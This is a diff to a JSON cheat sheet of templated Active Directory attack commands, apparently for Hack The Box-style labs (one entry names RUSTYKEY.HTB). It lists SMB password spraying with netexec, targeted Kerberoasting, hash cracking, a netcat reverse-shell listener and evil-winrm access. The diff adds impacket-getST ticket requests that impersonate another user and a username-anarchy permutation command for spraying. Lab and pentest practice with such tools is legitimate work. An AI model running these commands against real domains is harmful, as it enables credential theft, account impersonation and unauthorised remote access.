@@ -29,7 +29,10 @@
       "netexec smb {{IP}} -u {{USER}} -p password.txt --continue-on-succes",
       "netexec smb {{IP}} -u users.txt -p '{{PASSWORD}}' --continue-on-succes",
       "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' --request-user TARGET_USER",
-      "rlwrap -cAr nc -nlvp {{PORT}}"
+      "rlwrap -cAr nc -nlvp {{PORT}}",
+      "impacket-getST -spn 'cifs/{{DC.DOMAIN}}' -impersonate 'target_user' '{{DOMAIN}}/{{USER}}:{{PASSWORD}}'",
+      "./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchy_users.txt"
+
     ],
     "post-exploitation": [
       "evil-winrm -i {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}'",
@@ -78,6 +81,7 @@
       "john hash --wordlist=/usr/share/wordlists/rockyou.txt",
       "python3 targetedKerberoast.py -k --dc-host {{DC.DOMAIN}} -u {{USER}} -d {{DOMAIN}}",
       "rlwrap -cAr nc -nlvp {{PORT}}",
+      "impacket-getST 'RUSTYKEY.HTB/{{USER}}' -spn 'cifs/{{DC.DOMAIN}}' -impersonate target_user -dc-ip {{IP}} -k -no-pass",
       "./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchy_users.txt"
     ],
     "post-exploitation": [
